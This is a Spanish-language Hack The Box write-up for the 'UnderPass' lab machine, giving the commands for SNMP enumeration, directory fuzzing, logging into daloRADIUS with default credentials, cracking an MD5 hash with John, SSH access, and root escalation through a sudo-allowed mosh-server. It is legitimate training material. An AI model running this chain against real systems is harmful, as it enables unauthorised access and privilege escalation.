
![[Pasted image 20250405181310.png]]

## 1. Preparación del entorno

Conectamos la `VPN` de HTB y comprobamos que llegamos a la maquina

```
sudo openvpn htb.ovpn
```

```
ping -c1 10.10.11.48
```

Creamos nuestro directorio de trabajo con las siguiente estructura.

```
UnderPass\
  ├─ Scans\
  └─ Evidencias\
  └─ Scripts\
```

Para ello ejecutamos los siguientes comandos desde home.

```
mkdir ./Desktop/HTB/UnderPass

cd ./Desktop/HTB/UnderPass

mkdir scans evidencias scripts
```

Para no tener problemas en la resolución DNS, añadimos esta la informacion de la maquina en el fichero etc/hosts

```
echo "10.10.11.48    underpass.htb " | sudo tee -a /etc/hosts 
```

## 2. Fase de escaneo y recopilación de información

Entramos al directorio ``/scans``, donde vamos a volcar toda la información que saquemos de los escaneos. Lanzamos la herramienta`nmap`.

```
cd scans

sudo nmap -p- --open -sS --min-rate -n -Pn 10.10.11.48 -oN OpenPorts
```

![[Pasted image 20250405183854.png]]

Ahora que sabemos los puertos abiertos vamos a lanzar `nmap` con un conjunto de scripts que nos van a dar información adicional sobre los servicios y versiones de los mismos.

```
sudo nmap -p22,80 -sCV 10.10.11.48 -oN InfoPorts
```

![[Pasted image 20250405184029.png]]

- **Puerto 22/tcp - SSH:**
    - Servicio: **OpenSSH 8.9p1**
    - Sistema operativo: **Ubuntu Linux (versión 3ubuntu0.10)**
    - Protocolo: **SSH 2.0**

- **Puerto 80/tcp - HTTP:**
    - Servicio: **Apache HTTPD 2.4.52**
    - Sistema operativo: **Ubuntu**
    - Protocolo: **HTTP**

##### Desglose de los parámetros:
- `-p-`: Escanea todos los puertos (0-65535).
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Realiza un escaneo SYN (silencioso).
- `-sCV`: Detecta información adicional de servicios y las vesiones.
- `--min-rate 5000`: Define una velocidad mínima de escaneo.
- `-n`: Evita la resolución DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `-oN`: Guarda los resultados en un archivo

Vemos que hay a nivel web.

```
whatweb http://10.10.11.48
```

![[Pasted image 20250405184840.png]]

Si abrimos la web encontramos un apache por defecto

![[Pasted image 20250405184927.png]]

Tras no encontrar nada, voy a lanzar un escaneo para UDP (User Datagram Protocol). Para ello lanzo el siguiente comando.

```
sudo nmap -p- --open -sU --min-rate 7000 -Pn 10.10.11.48 -oN UDPScan
```

![[Pasted image 20250405191222.png]]

Lanzo un escaneo para comprobar el servicio y la versión del **puerto 161**
```
sudo nmap -p161 -sU -sCV  10.10.11.48 -oN UDPInfoPort
```
![[Pasted image 20250405191536.png]]

Vemos que está el puerto 161 con el servicio  SNMPv1 (public). Ahora lo que voy a hacer es buscar información publica del servicio **snmp**.

```
snmpwalk -v 1 -c public 10.10.11.48 >> ../evidencias/snmp.txt
```

![[Pasted image 20250405193311.png]]

Vemos que hay un usuario, voy a guardarlo en el fichero user.txt por si fuese útil más adelante. 
```
echo "steve@underpass.htb" > user.txt
```

También tenemos la frase **`Service Info: Host: UnDerPass.htb is the only daloradius server in the basin.`** He encontrado que `dolaradius`es un una aplicación de gestión web Radius. 

A continuación, vamos a ver que esconde el servicio daloradius, para ello introducimos lo siguiente en el navegador:

```
http://underpass.htb/daloradius
```

No tenemos permisos para visualizar la pagina.

![[Pasted image 20250405194458.png]]
Como no tenemos acceso vamos a ver si realizando fuzzing encontramos mas directorios o archivos. Voy a usar la herramienta `gobuster`

```
gobuster dir -u http://underpass.htb/daloradius -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```

![[Pasted image 20250408115828.png]]

Seguimos buscando información, para ello voy a hacer fuzz en el resto de directorios.

- **Fuzzing  /app**

```
gobuster dir -u http://underpass.htb/daloradius/app -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
![[Pasted image 20250408120854.png]]

Seguimos buscando información en estos 3 directorios. Voy a buscar también por extensión de archivos. 
```
gobuster dir -u http://underpass.htb/daloradius/app/users -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```
![[Pasted image 20250408121632.png]]
```
gobuster dir -u http://underpass.htb/daloradius/app/operators -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```
![[Pasted image 20250408121734.png]]

## 3. Fase de explotación.

Al realizar ``fuzzing en Users y Operators`` encontramos un panel de login en login.php. Voy a probar usar la contraseña por defecto del servicio daloRADIUS, si no funciona voy a probar si es vulnerable a SQLInyection.

![[Pasted image 20250408111020.png]]

**La pagina operators, tiene la contraseña por defecto**. Mientras que users no.

```
http://underpass.htb/daloradius/app/operators/login.php
```

Esta es la pagina web que tenemos. Además hemos accedido como administrador

![[Pasted image 20250408122601.png]]

Tras un rato investigando la pagina he encontrado información valiosa como:

-``Los servicios activos``

![[Pasted image 20250408123006.png]]

-`Usuario y contraseña cifrada`: tengo este archivo .csv con la contraseña y el método de cifrado, que es MD5

![[Pasted image 20250408123154.png]]

Voy a crear el archivo `hash.txt` en el directorio evidencias, en este voy a guardar el hash del usuario svcMosh. Para romperlo voy a utilizar **John**

```
echo "412DD4759978ACFCC81DEAB01B382403" > hash.txt

john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
```

![[Pasted image 20250408124731.png]]

Ahora que tengo un usuario y contraseña voy a tratar de acceder por SSH.

```
ssh svcMosh@10.10.11.48 
```

Accedo sin problemas con el usuario ``svcMosh``

![[Pasted image 20250408140352.png]]

Leemos el archivo `ùser.txt` y encontramos la primera flag
![[Pasted image 20250408125759.png]]

![[Pasted image 20250408130059.png]]

## 4. Escalada de Privilegios

Con el siguiente comando podemos ver que archivos puede ejecutar el usuario actual como root, sin necesidad de proporcionar una contraseña.
```
sudo -l 
```
![[Pasted image 20250408125730.png]]

Encontramos el binario **mosh-server** *(Mosh (Mobility Shell) es un servidor y cliente SSH multiplataforma y que está optimizado para redes en continúa movilidad como 3G o Wi-Fi).* Para llegar a explotarlo veo las opciones de ejecución que tengo..

![[Pasted image 20250408140108.png]]

Si ejecutamos este comando explotaremos el servicio mosh, ya que nos vamos a lanzar una sesión de SSH como el usuario root de manera local.

```
mosh --server="sudo /usr/bin/mosh-server" localhost
```

Comprobamos que soy `root` y vemos el archivo **root.txt** con la segunda flag.

![[Pasted image 20250408132221.png]]

####                                              **Maquina Pwned**

![[Pasted image 20250408132757.png]]